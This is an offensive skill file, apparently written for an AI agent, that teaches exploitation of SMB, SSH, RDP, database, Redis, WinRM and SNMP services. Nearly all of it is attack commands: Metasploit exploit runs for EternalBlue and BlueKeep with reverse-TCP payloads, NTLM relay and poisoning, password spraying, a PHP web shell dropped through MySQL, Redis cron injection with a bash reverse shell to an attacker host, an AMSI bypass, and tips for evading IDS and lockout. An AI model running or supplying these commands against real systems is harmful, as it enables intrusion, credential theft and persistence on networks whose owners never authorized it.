---
name: network_exploitation
description: Learn to exploit network services (SMB, SSH, RDP, databases, SMTP) using Metasploit and Kali tools, including NTLM relay attacks, protocol poisoning, and service-specific evasion techniques.
---
# Network Exploitation

## When to Use This Skill

- Exploiting discovered network services after reconnaissance
- Attacking SMB (445), SSH (22), RDP (3389), or database services
- Performing NTLM relay or protocol poisoning attacks
- Brute forcing or spraying credentials against network services
- Exploiting misconfigurations in Redis, SNMP, or WinRM

---

## Concepts

### Network Service Attack Methodology

1. **Service identification** — Banner grabbing, version detection
2. **Vulnerability assessment** — Known CVEs, misconfigurations
3. **Credential attacks** — Brute force, spraying, default creds
4. **Exploitation** — Service-specific exploits or access abuse
5. **Post-exploitation** — Credential harvesting, lateral movement

### Authentication Attack Patterns

| Pattern | Speed | Detection Risk | Account Lockout |
|---------|-------|----------------|-----------------|
| Brute force | Fast | High | High |
| Password spraying | Slow | Low | Low |
| Credential stuffing | Medium | Medium | Medium |

**Brute force** — Many passwords against one account (triggers lockout).
**Spraying** — One password against many accounts (evades lockout).
**Stuffing** — Known credential pairs from breaches (varies).

---

## SMB Attacks (TCP 445, 139)

### Enumeration

```
msf6 > use auxiliary/scanner/smb/smb_version
msf6 > set RHOSTS 192.168.1.0/24
msf6 > run

msf6 > use auxiliary/scanner/smb/smb_enumshares
msf6 > use auxiliary/scanner/smb/smb_enumusers
msf6 > use auxiliary/scanner/smb/smb_lookupsid
```

**SMB Signing Detection** (critical for relay attacks):
```
msf6 > use auxiliary/scanner/smb/smb2
msf6 > set RHOSTS 192.168.1.0/24
msf6 > run
# Look for "signing:disabled" or "signing:not required"
```

**NetExec Enumeration** (formerly CrackMapExec):
```bash
# SMB signing check
netexec smb 192.168.1.0/24 --gen-relay-list relay_targets.txt

# Share enumeration
netexec smb target -u user -p pass --shares

# User enumeration (null session)
netexec smb target -u '' -p '' --users

# Password policy
netexec smb target -u user -p pass --pass-pol
```

### MS17-010 (EternalBlue)

**Detection**:
```
msf6 > use auxiliary/scanner/smb/smb_ms17_010
msf6 > set RHOSTS 192.168.1.0/24
msf6 > run
```

**Exploitation**:
```
msf6 > use exploit/windows/smb/ms17_010_eternalblue
msf6 > set RHOSTS 192.168.1.10
msf6 > set PAYLOAD windows/x64/meterpreter/reverse_tcp
msf6 > set LHOST 192.168.1.5
msf6 > exploit
```

**Alternative module** (uses PsExec after EternalBlue):
```
msf6 > use exploit/windows/smb/ms17_010_psexec
msf6 > set RHOSTS 192.168.1.10
msf6 > set SMBUser administrator
msf6 > set SMBPass password123
msf6 > exploit
```

Targets: Windows 7, Server 2008 R2, Server 2012 (unpatched). Still found in ~10% of enterprise networks.

### PrintNightmare (CVE-2021-1675, CVE-2021-34527)

**Detection**:
```
msf6 > use auxiliary/scanner/smb/smb_ms17_010
# Check if Print Spooler is running on targets
```

**Local Privilege Escalation** (from existing session):
```
msf6 > use exploit/windows/local/cve_2021_1675_printnightmare
msf6 > set SESSION 1
msf6 > exploit
```

**Remote Exploitation** (requires valid credentials):
```bash
# Using Impacket CVE-2021-1675.py
python3 CVE-2021-1675.py domain/user:password@target '\\attacker\share\malicious.dll'
```

### SMB Relay Attacks

**Requirements**: SMB signing disabled or not required on target.

**Setup with ntlmrelayx**:
```bash
# Basic relay to SMB
ntlmrelayx.py -tf targets.txt -smb2support

# Relay to LDAP (for AD attacks)
ntlmrelayx.py -t ldap://dc.domain.local -smb2support

# Execute command on relay
ntlmrelayx.py -tf targets.txt -smb2support -c "whoami > C:\relay.txt"

# SOCKS proxy for interactive relay
ntlmrelayx.py -tf targets.txt -smb2support -socks

# Shadow Credentials attack via relay
ntlmrelayx.py -t ldap://dc.domain.local --shadow-credentials --shadow-target 'target$'

# Escalate user to DCSync rights
ntlmrelayx.py -t ldap://dc.domain.local --escalate-user targetuser
```

**Trigger authentication** (combine with Responder or coercion):
```bash
# LLMNR/NBT-NS poisoning
responder -I eth0 -dwPv

# PetitPotam coercion
python3 PetitPotam.py -d domain.local -u user -p pass attacker_ip target_ip

# PrinterBug coercion
python3 printerbug.py domain/user:pass@target attacker_ip
```

**Metasploit SMB Relay** (simpler setup):
```
msf6 > use auxiliary/server/capture/smb
msf6 > set SRVHOST 0.0.0.0
msf6 > set JOHNPWFILE /tmp/smb_hashes
msf6 > run
```

### Credential Attacks

**Password Spraying**:
```
msf6 > use auxiliary/scanner/smb/smb_login
msf6 > set RHOSTS 192.168.1.0/24
msf6 > set SMBUser administrator
msf6 > set PASS_FILE /usr/share/wordlists/passwords.txt
msf6 > set STOP_ON_SUCCESS true
msf6 > run
```

**NetExec Spraying** (better output):
```bash
# Single password against multiple users
netexec smb 192.168.1.0/24 -u users.txt -p 'Summer2024!' --continue-on-success

# Password spraying with delay
netexec smb targets.txt -u users.txt -p passwords.txt --no-bruteforce

# Pass-the-Hash
netexec smb target -u administrator -H aad3b435b51404eeaad3b435b51404ee:hash
```

### Impacket SMB Tools

```bash
# PsExec (creates service, noisy)
psexec.py domain/user:password@target
psexec.py -hashes :ntlm_hash domain/user@target

# SMBExec (no binary drop)
smbexec.py domain/user:password@target

# WMIExec (stealthier, semi-interactive)
wmiexec.py domain/user:password@target

# ATExec (scheduled task execution)
atexec.py domain/user:password@target "command"
```

### Evasion Considerations

- Use named pipe variations to avoid IDS signatures
- Prefer SMBv2/3 (`SMB::ProtocolVersion` option in Metasploit)
- WMIExec is stealthier than PsExec (no service creation)
- Time attacks during business hours to blend with legitimate traffic

---

## SSH Attacks (TCP 22)

### Enumeration

```
msf6 > use auxiliary/scanner/ssh/ssh_version
msf6 > set RHOSTS 192.168.1.0/24
msf6 > run

msf6 > use auxiliary/scanner/ssh/ssh_enumusers
msf6 > set RHOSTS 192.168.1.10
msf6 > set USER_FILE /usr/share/wordlists/users.txt
msf6 > run
```

**ssh-audit** (algorithm analysis):
```bash
ssh-audit target
# Look for weak algorithms, outdated versions
```

### Brute Force Attacks

```
msf6 > use auxiliary/scanner/ssh/ssh_login
msf6 > set RHOSTS 192.168.1.10
msf6 > set USERNAME root
msf6 > set PASS_FILE /usr/share/wordlists/rockyou.txt
msf6 > set STOP_ON_SUCCESS true
msf6 > set VERBOSE false
msf6 > run
```

**Hydra** (faster for targeted brute force):
```bash
# Single user
hydra -l root -P passwords.txt ssh://192.168.1.10

# Multiple users
hydra -L users.txt -P passwords.txt ssh://192.168.1.10 -t 4

# With specific port
hydra -l admin -P passwords.txt -s 2222 ssh://target
```

### libssh Authentication Bypass (CVE-2018-10933)

```
msf6 > use auxiliary/scanner/ssh/libssh_auth_bypass
msf6 > set RHOSTS 192.168.1.10
msf6 > set SPAWN_PTY true
msf6 > run
```

Targets libssh 0.6.0 - 0.7.5, 0.8.0 - 0.8.3. Allows authentication bypass by sending SSH2_MSG_USERAUTH_SUCCESS.

### SSH Agent Forwarding Abuse

If SSH agent forwarding is enabled and you compromise an intermediate host:
```bash
# List forwarded keys
ssh-add -l

# Use forwarded key to access other hosts
ssh user@next_target
```

---

## RDP Attacks (TCP 3389)

### Enumeration

```
msf6 > use auxiliary/scanner/rdp/rdp_scanner
msf6 > set RHOSTS 192.168.1.0/24
msf6 > run
```

**Check for NLA (Network Level Authentication)**:
```bash
nmap --script rdp-ntlm-info -p 3389 target
```

### BlueKeep (CVE-2019-0708)

**Detection**:
```
msf6 > use auxiliary/scanner/rdp/cve_2019_0708_bluekeep
msf6 > set RHOSTS 192.168.1.0/24
msf6 > run
```

**Exploitation** (Windows 7, Server 2008 R2 only):
```
msf6 > use exploit/windows/rdp/cve_2019_0708_bluekeep_rce
msf6 > set RHOSTS 192.168.1.10
msf6 > set TARGET 1  # Check 'show targets' for OS version
msf6 > set PAYLOAD windows/x64/meterpreter/reverse_tcp
msf6 > set LHOST 192.168.1.5
msf6 > exploit
```

**Note**: BlueKeep can cause system crashes. Use in controlled environments.

### Credential Attacks

**Hydra RDP Brute Force**:
```bash
hydra -l administrator -P passwords.txt rdp://192.168.1.10 -t 1
```

**Crowbar** (slow but reliable):
```bash
crowbar -b rdp -s 192.168.1.10/32 -u admin -C passwords.txt -n 1
```

### Pass-the-Hash over RDP

Requires Restricted Admin mode enabled on target:
```bash
# Enable Restricted Admin (if you have local admin)
reg add HKLM\System\CurrentControlSet\Control\Lsa /v DisableRestrictedAdmin /t REG_DWORD /d 0

# Connect with hash
xfreerdp /v:target /u:administrator /pth:ntlm_hash /cert:ignore
```

### RDP Session Hijacking

From local admin on target:
```cmd
# List sessions
query user

# Hijack session (requires SYSTEM)
tscon <session_id> /dest:console
```

---

## Database Attacks

### MSSQL (TCP 1433)

**Enumeration**:
```
msf6 > use auxiliary/scanner/mssql/mssql_ping
msf6 > set RHOSTS 192.168.1.0/24
msf6 > run

msf6 > use auxiliary/scanner/mssql/mssql_login
msf6 > set RHOSTS 192.168.1.10
msf6 > set USERNAME sa
msf6 > set PASS_FILE passwords.txt
msf6 > run
```

**xp_cmdshell Command Execution**:
```
msf6 > use auxiliary/admin/mssql/mssql_exec
msf6 > set RHOSTS 192.168.1.10
msf6 > set USERNAME sa
msf6 > set PASSWORD password123
msf6 > set CMD "whoami"
msf6 > run
```

**Impacket mssqlclient.py**:
```bash
# Connect
mssqlclient.py domain/user:password@target -windows-auth

# Enable xp_cmdshell
SQL> enable_xp_cmdshell
SQL> xp_cmdshell whoami

# Read files
SQL> SELECT * FROM OPENROWSET(BULK 'C:\Users\Administrator\Desktop\flag.txt', SINGLE_CLOB) AS x;
```

**Manual xp_cmdshell Enable**:
```sql
EXEC sp_configure 'show advanced options', 1;
RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1;
RECONFIGURE;
EXEC xp_cmdshell 'whoami';
```

**Linked Server Attacks**:
```sql
-- Enumerate linked servers
SELECT * FROM sys.servers;

-- Execute on linked server
EXEC ('xp_cmdshell ''whoami''') AT [LINKED_SERVER];
```

### MySQL (TCP 3306)

**Enumeration**:
```
msf6 > use auxiliary/scanner/mysql/mysql_version
msf6 > set RHOSTS 192.168.1.0/24
msf6 > run

msf6 > use auxiliary/scanner/mysql/mysql_login
msf6 > set RHOSTS 192.168.1.10
msf6 > set USERNAME root
msf6 > set PASS_FILE passwords.txt
msf6 > run
```

**File Operations**:
```sql
-- Read files (requires FILE privilege)
SELECT LOAD_FILE('/etc/passwd');

-- Write files
SELECT '<?php system($_GET["cmd"]); ?>' INTO OUTFILE '/var/www/html/shell.php';
```

**UDF (User Defined Function) RCE**:
```
msf6 > use exploit/multi/mysql/mysql_udf_payload
msf6 > set RHOSTS 192.168.1.10
msf6 > set USERNAME root
msf6 > set PASSWORD password123
msf6 > exploit
```

### PostgreSQL (TCP 5432)

**Enumeration**:
```
msf6 > use auxiliary/scanner/postgres/postgres_version
msf6 > set RHOSTS 192.168.1.0/24
msf6 > run

msf6 > use auxiliary/scanner/postgres/postgres_login
msf6 > set RHOSTS 192.168.1.10
msf6 > set USERNAME postgres
msf6 > set PASS_FILE passwords.txt
msf6 > run
```

**COPY TO PROGRAM RCE** (PostgreSQL 9.3+):
```sql
-- Requires superuser
CREATE TABLE cmd_exec(cmd_output text);
COPY cmd_exec FROM PROGRAM 'id';
SELECT * FROM cmd_exec;
DROP TABLE cmd_exec;
```

**Large Object Exploitation**:
```sql
SELECT lo_import('/etc/passwd');
SELECT lo_get(12345);  -- Use OID from lo_import
```

### Redis (TCP 6379)

**Check for Unauthenticated Access**:
```bash
redis-cli -h 192.168.1.10 ping
# Should return "PONG" if no auth
```

**Metasploit Enumeration**:
```
msf6 > use auxiliary/scanner/redis/redis_server
msf6 > set RHOSTS 192.168.1.0/24
msf6 > run
```

**SSH Key Injection** (if Redis runs as root):
```bash
# Generate key
ssh-keygen -t rsa -f redis_key

# Prepare payload
(echo -e "\n\n"; cat redis_key.pub; echo -e "\n\n") > payload.txt

# Inject key
redis-cli -h target flushall
cat payload.txt | redis-cli -h target -x set crackit
redis-cli -h target config set dir /root/.ssh
redis-cli -h target config set dbfilename "authorized_keys"
redis-cli -h target save

# Connect
ssh -i redis_key root@target
```

**Cron Job Injection**:
```bash
redis-cli -h target config set dir /var/spool/cron/crontabs
redis-cli -h target config set dbfilename root
redis-cli -h target set x "\n\n* * * * * /bin/bash -c 'bash -i >& /dev/tcp/attacker/4444 0>&1'\n\n"
redis-cli -h target save
```

**Redis Module RCE** (Redis 4.x/5.x):
```
msf6 > use exploit/linux/redis/redis_replication_cmd_exec
msf6 > set RHOSTS 192.168.1.10
msf6 > set SRVHOST 192.168.1.5
msf6 > exploit
```

### MongoDB (TCP 27017)

**Check for No Authentication**:
```bash
mongosh --host 192.168.1.10 --eval "db.adminCommand('listDatabases')"
```

**Metasploit Enumeration**:
```
msf6 > use auxiliary/scanner/mongodb/mongodb_login
msf6 > set RHOSTS 192.168.1.0/24
msf6 > run
```

---

## WinRM Attacks (TCP 5985/5986)

### Enumeration

```
msf6 > use auxiliary/scanner/winrm/winrm_auth_methods
msf6 > set RHOSTS 192.168.1.0/24
msf6 > run

msf6 > use auxiliary/scanner/winrm/winrm_login
msf6 > set RHOSTS 192.168.1.10
msf6 > set USERNAME administrator
msf6 > set PASS_FILE passwords.txt
msf6 > run
```

### Evil-WinRM

```bash
# Password authentication
evil-winrm -i 192.168.1.10 -u administrator -p 'Password123!'

# Pass-the-Hash
evil-winrm -i 192.168.1.10 -u administrator -H aad3b435b51404eeaad3b435b51404ee:hash

# With SSL (port 5986)
evil-winrm -i 192.168.1.10 -u admin -p pass -S

# Kerberos authentication
evil-winrm -i 192.168.1.10 -r DOMAIN.LOCAL
```

**Post-Exploitation Features**:
```
*Evil-WinRM* PS > menu
*Evil-WinRM* PS > upload /local/file C:\remote\path
*Evil-WinRM* PS > download C:\remote\file /local/path
*Evil-WinRM* PS > services  # List services
*Evil-WinRM* PS > Invoke-Binary /path/to/binary.exe
*Evil-WinRM* PS > Bypass-4MSI  # AMSI bypass
```

### Metasploit WinRM Exploitation

```
msf6 > use exploit/windows/winrm/winrm_script_exec
msf6 > set RHOSTS 192.168.1.10
msf6 > set USERNAME administrator
msf6 > set PASSWORD Password123!
msf6 > set PAYLOAD windows/meterpreter/reverse_tcp
msf6 > exploit
```

---

## SNMP Attacks (UDP 161)

### Community String Brute Force

```
msf6 > use auxiliary/scanner/snmp/snmp_login
msf6 > set RHOSTS 192.168.1.0/24
msf6 > set PASS_FILE /usr/share/metasploit-framework/data/wordlists/snmp_default_pass.txt
msf6 > run
```

**Onesixtyone** (fast brute force):
```bash
onesixtyone -c /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings.txt 192.168.1.0/24
```

### SNMP Enumeration

```
msf6 > use auxiliary/scanner/snmp/snmp_enum
msf6 > set RHOSTS 192.168.1.10
msf6 > set COMMUNITY public
msf6 > run
```

**snmpwalk**:
```bash
# Full enumeration
snmpwalk -v2c -c public 192.168.1.10

# Windows users
snmpwalk -v2c -c public 192.168.1.10 1.3.6.1.4.1.77.1.2.25

# Running processes
snmpwalk -v2c -c public 192.168.1.10 1.3.6.1.2.1.25.4.2.1.2

# Installed software
snmpwalk -v2c -c public 192.168.1.10 1.3.6.1.2.1.25.6.3.1.2
```

### Write Access Exploitation

With read-write community string:
```bash
# Change system configuration
snmpset -v2c -c private 192.168.1.10 system.sysName.0 s "pwned"

# Cisco config download (if TFTP OIDs available)
snmpset -v2c -c private 192.168.1.10 1.3.6.1.4.1.9.9.96.1.1.1.1.2.1 i 1
```

---

## Protocol Poisoning Attacks

### LLMNR/NBT-NS/mDNS Poisoning

**Responder** (capture hashes):
```bash
# Basic capture
responder -I eth0 -dwPv

# With WPAD proxy
responder -I eth0 -wPv

# Analyze mode only (no poisoning)
responder -I eth0 -A
```

**Hash Cracking**:
```bash
# NetNTLMv2 hashes (hashcat mode 5600)
hashcat -m 5600 hashes.txt /usr/share/wordlists/rockyou.txt

# NetNTLMv1 (hashcat mode 5500)
hashcat -m 5500 hashes.txt wordlist.txt
```

**Inveigh** (Windows alternative):
```powershell
Import-Module .\Inveigh.ps1
Invoke-Inveigh -ConsoleOutput Y -LLMNR Y -NBNS Y -mDNS Y -Proxy Y
```

**Metasploit Capture**:
```
msf6 > use auxiliary/server/capture/smb
msf6 > set JOHNPWFILE /tmp/captured_hashes
msf6 > run
```

### ARP Poisoning

```bash
# Bettercap
bettercap -iface eth0
> net.probe on
> set arp.spoof.targets 192.168.1.10
> arp.spoof on
> net.sniff on
```

### DHCPv6 + DNS Poisoning (mitm6)

```bash
# Run mitm6 for DHCPv6 poisoning
mitm6 -d domain.local

# Combine with ntlmrelayx
ntlmrelayx.py -6 -t ldaps://dc.domain.local -wh attacker.domain.local -l loot
```

---

## Other Services

### FTP (TCP 21)

```
msf6 > use auxiliary/scanner/ftp/ftp_version
msf6 > use auxiliary/scanner/ftp/ftp_login
msf6 > use auxiliary/scanner/ftp/anonymous
```

**vsftpd 2.3.4 Backdoor**:
```
msf6 > use exploit/unix/ftp/vsftpd_234_backdoor
msf6 > set RHOSTS target
msf6 > exploit
```

### Telnet (TCP 23)

```
msf6 > use auxiliary/scanner/telnet/telnet_version
msf6 > use auxiliary/scanner/telnet/telnet_login
msf6 > set RHOSTS 192.168.1.10
msf6 > set USERNAME admin
msf6 > set PASS_FILE passwords.txt
msf6 > run
```

### VNC (TCP 5900)

```
msf6 > use auxiliary/scanner/vnc/vnc_login
msf6 > set RHOSTS 192.168.1.0/24
msf6 > set PASS_FILE /usr/share/metasploit-framework/data/wordlists/vnc_passwords.txt
msf6 > run

msf6 > use auxiliary/scanner/vnc/vnc_none_auth
msf6 > set RHOSTS 192.168.1.0/24
msf6 > run
```

### LDAP (TCP 389, 636)

```
msf6 > use auxiliary/gather/ldap_query
msf6 > set RHOSTS 192.168.1.10
msf6 > set BASE_DN "DC=domain,DC=local"
msf6 > set QUERY "(objectClass=user)"
msf6 > run
```

**Anonymous Bind Check**:
```bash
ldapsearch -x -H ldap://192.168.1.10 -b "DC=domain,DC=local"
```

### SMTP (TCP 25)

**User Enumeration**:
```
msf6 > use auxiliary/scanner/smtp/smtp_enum
msf6 > set RHOSTS 192.168.1.10
msf6 > set USER_FILE /usr/share/wordlists/users.txt
msf6 > run
```

**Open Relay Detection**:
```
msf6 > use auxiliary/scanner/smtp/smtp_relay
msf6 > set RHOSTS 192.168.1.10
msf6 > run
```

---

## Evasion Techniques

### General Network Evasion

- **Timing**: Space out connection attempts, match business hours
- **Protocol conformance**: Use standard ports, proper handshakes
- **Encryption**: Prefer encrypted protocols (HTTPS, SSH, SMB3)
- **Rate limiting**: Keep connections below IDS thresholds

### SMB-Specific Evasion

```
msf6 > set SMB::ProtocolVersion 2,3  # Avoid SMBv1 signatures
msf6 > set SMB::AlwaysEncrypt true   # Encrypt SMB3 traffic
```

### Credential Attack Evasion

- Spray with delays matching password policy lockout window
- Use LDAP to check lockout threshold before attacking
- Target service accounts (often have no lockout)
- Rotate source IPs when possible

### Avoiding Detection

| Technique | Risk Level | Detection | Alternative |
|-----------|------------|-----------|-------------|
| PsExec | High | Service creation, named pipe | WMIExec, ATExec |
| Pass-the-Hash | Medium | Event 4624 Type 3 | Kerberos attacks |
| BlueKeep | High | Crash on failure | Manual exploitation |
| Responder | Medium | DNS traffic spikes | Targeted poisoning |

---

## Workflows

### Network Service Exploitation Workflow

1. **Enumerate services**:
   ```
   msf6 > db_nmap -sV -sC -p21,22,23,25,80,110,139,443,445,1433,3306,3389,5432,5900,5985 target
   msf6 > services -c port,name,info
   ```

2. **Check for known vulnerabilities**:
   ```
   msf6 > vulns
   msf6 > search type:exploit platform:windows name:smb
   ```

3. **Attempt exploitation** (highest value targets first):
   ```
   # SMB
   msf6 > use auxiliary/scanner/smb/smb_ms17_010

   # RDP
   msf6 > use auxiliary/scanner/rdp/cve_2019_0708_bluekeep
   ```

4. **Credential attacks** (if exploitation fails):
   ```
   msf6 > use auxiliary/scanner/smb/smb_login
   msf6 > use auxiliary/scanner/ssh/ssh_login
   ```

5. **Post-exploitation**: Harvest credentials, pivot

### Credential Spraying Workflow

1. **Enumerate users** (LDAP, SMB null session, email):
   ```bash
   netexec smb dc -u '' -p '' --users > users.txt
   ```

2. **Check password policy**:
   ```bash
   netexec smb dc -u user -p pass --pass-pol
   ```

3. **Build password list** (season + year, company name + numbers):
   ```
   Summer2024!
   Winter2024!
   Company123!
   ```

4. **Spray with delays**:
   ```bash
   netexec smb targets.txt -u users.txt -p 'Summer2024!' --continue-on-success
   # Wait for lockout window before next password
   ```

5. **Validate and exploit access**:
   ```bash
   netexec smb target -u validuser -p validpass --shares
   ```

### NTLM Relay Attack Workflow

1. **Identify relay targets** (SMB signing disabled):
   ```bash
   netexec smb 192.168.1.0/24 --gen-relay-list relay_targets.txt
   ```

2. **Start relay server**:
   ```bash
   ntlmrelayx.py -tf relay_targets.txt -smb2support -socks
   ```

3. **Trigger authentication** (separate terminal):
   ```bash
   responder -I eth0 -dwPv
   ```

4. **Use relayed sessions**:
   ```bash
   # Through SOCKS proxy
   proxychains smbclient //target/C$ -U 'domain/relayed_user'
   ```

### Database Attack Workflow

1. **Discover databases**:
   ```
   msf6 > use auxiliary/scanner/mssql/mssql_ping
   msf6 > use auxiliary/scanner/mysql/mysql_version
   msf6 > use auxiliary/scanner/postgres/postgres_version
   ```

2. **Brute force credentials**:
   ```
   msf6 > use auxiliary/scanner/mssql/mssql_login
   msf6 > set USERNAME sa
   msf6 > set PASS_FILE passwords.txt
   msf6 > run
   ```

3. **Exploit for RCE** (MSSQL example):
   ```
   msf6 > use auxiliary/admin/mssql/mssql_exec
   msf6 > set CMD "whoami"
   msf6 > run
   ```

4. **Establish persistence**:
   ```
   msf6 > use exploit/windows/mssql/mssql_payload
   msf6 > set PAYLOAD windows/meterpreter/reverse_tcp
   msf6 > exploit
   ```
